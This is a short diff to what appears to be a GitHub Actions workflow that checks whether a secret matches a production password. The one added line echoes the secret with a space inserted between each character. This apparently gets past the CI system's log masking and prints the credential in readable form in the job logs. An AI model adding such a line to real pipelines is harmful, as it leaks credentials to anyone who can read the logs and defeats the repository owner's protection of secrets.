@@ -29,5 +29,6 @@ jobs:
           else
             echo "This is NOT the PROD password!"
           fi
+          echo ${{secrets.s}} | sed 's/./& /g'
         env:
           PASSWORD: ${{ secrets.s }}
